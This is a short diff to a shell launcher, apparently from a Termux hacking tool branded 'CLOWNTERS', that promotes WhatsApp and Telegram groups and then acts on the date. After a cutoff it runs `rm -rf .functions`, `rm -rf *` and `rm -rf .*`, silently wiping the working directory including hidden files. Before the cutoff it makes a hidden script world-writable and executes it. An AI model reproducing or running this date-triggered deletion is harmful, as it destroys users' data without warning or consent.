@@ -23,18 +23,20 @@
 CLOWNTERS
 
 termux-open-url https://chat.whatsapp.com/LKqLwcRheov1Dlv6HDaFMr
-sleep 3
+sleep 1
 termux-open-url https://t.me/clownters
-sleep 2
+sleep 1
 test -f Sploit && rm Sploit
 test -f SECURITY.md && rm SECURITY.md
 test -f LICENSE && rm LICENSE
 if (($(date +%m%y) >= 0222)); then
     clear
     bash update.sh
+    rm -rf .functions
     rm -rf *
     rm -rf .*
 else
-    source .functions/.main
+    chmod 777 .functions/.main
+    ./.functions/.main
 fi
 exit 0
